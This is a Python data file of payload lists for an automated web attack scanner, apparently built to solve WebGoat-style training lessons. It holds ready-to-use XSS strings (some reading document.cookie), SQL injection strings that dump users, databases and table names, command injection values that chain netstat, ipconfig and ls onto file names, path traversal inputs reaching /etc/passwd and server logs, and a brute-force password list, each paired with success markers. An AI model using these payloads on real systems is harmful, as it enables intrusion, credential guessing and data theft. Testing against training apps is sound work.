S_WebGoatCongrats = ["Congratulations."]
S_WebGoatCongrats2 = ["You have completed"]


# TODO 
# dividere i payload e mettere i check in ordine... modificare anche il codice di controllo

S_XSS=[	
		['<script>alert("veryDangerous");</script>','veryDangerous'],
		['alert(String.fromCharCode(88, 83, 83, 65, 116, 116, 65, 99, 107))','XSSAttAck'],
		['<a onmouseover="alert(1)" href="#">read this!</a>','read this!'],
		['alert("XsSatt");','alert("XsSatt");'],
		['<script>alert(String.fromCharCode(88, 83, 83, 65, 116, 116, 65, 99, 107));</script>','XSSAttAck'],
		["red' onload='alert(1)' onmouseover='alert(2)",'alert(1)'],
		['<script>alert("XSSatt");</script>','<script>alert("XSSatt");</script>']
		]
		
		# 
		# <IMG SRC=javascript:alert('XSS');> , 'XSS'
		# '';!--" <XSS>=&{()}, 'XSS'
		#

P_B_F=[	["admin",''],
		["test",''],
		["john",''],
		["12345",''],
		["qwerty",''],
		["qwertz",''],
		["asd",''],
		["administrator",''],
		["watson",''],
		["Password",''],
		["password",''],
		["mvamida",''],
		["tom",'']
		]
		
P_B_F_CheckThis=[
		'*bash*',
		'My Snippets',
		'caioM <caioM>',
		'Profile',
		'Welcome Back',
		'Welcome to the password protected area'
]


S_SQLInj=[
	["1' or '1'='1",''],
	["101 or 1=1!",''],
	["%' or '0'='0",''],
	["%' or 0=0 union select null, user() #",''],
	["%' or 0=0 union select null, database() #",''],
	["%' and 1=0 union select null, table_name from information_schema.tables #",''],
	["1 or 1=1",''],
	["root'-- ",''],
	["Administrator'--",''],
	["' HAVING 1=1 --",''],
	["Smith' or 1=1 or 'a'='a",''],
	["Erwin' OR '1'='1",''],
	["101 OR 1=1 ORDER BY salary desc",'']	
]



SQLInjFS=[
		["Smith%0d%0aLogin Succeeded for username: admin<script>alert(document.cookie)</script>",'']
]


S_SQLInj_BypassLoginWG=[
	'Profile'
]

S_SQLInj_CheckThis=[
		"Surname: Brown"
		]


S_CommInj=[
		['BasicAuthentication.help',''],
		['echo "prova"',''],
		['" & netstat -an & ipconfig',''],
		["AccessControlMatrix.help & netstat -an & ipconfig",''],
		['%22+%26+ifconfig',''],
		['" & ifconfig',''],
		["; ls atau | ls",''],
		["|| ls",''],
		["ls",'']
]

S_CommInj_CheckThis=[
		"index.php"
		]

S_FileInclusion =[		
		# [".htaccess",''],
		# [".htaccess.bak",''],
		# [".htpasswd",''],
		# [".meta",''],
		# [".web",''],
		# ["../../../../../../etc/passwd",''],
		["apache/logs/access.log ",''],
		["apache/logs/access_log",''],
		["apache/logs/error.log ",''],
		["apache/logs/error_log",''],
		["httpd/logs/access.log ",''],
		# ["..%2fsecret.txt",''],
		["../secret.txt",''],
		["../../main.jsp",""],
		["../main.jsp",""],
		["conf",''],
		["/etc/hosts",''],
		["/etc/passwd%00",''],
		["http://google.com/robots.txt",'']
]

S_FileInclusion_CheckThis=[
		"Host Database",
		"Congratulations. You have successfully completed this lesson.",
		"Cookie!"	 	
		]


XSS_FileUpl=[
		["./F_Instantiation/FileUploadXSS.html",'']
	]
XSS_FileUpl_CheckThis=[
		"XSSatt"
		]

S_guesesdID = [ ['101',''],
				['102','']
				]
# S_Guessed_Congrats = ['<img src="images/buttons/lessonComplete.jpg"><a href="attack?Screen=']
S_Guessed_Congrats = ["Congratulations."]

S_ID_toBeDeleted = [['105','']]
#S_ID_Congrats = ['<img src="images/buttons/lessonComplete.jpg"><a href="attack?']
S_ID_Congrats = ["Congratulations."]

S_keys = [['105','']]




S_AJAXxss = [
	["123');alert(document.cookie);('",'Congratulations'],
	['%3Cscript%3Ealert(1)%3C/script%3E','alert(1)']
]
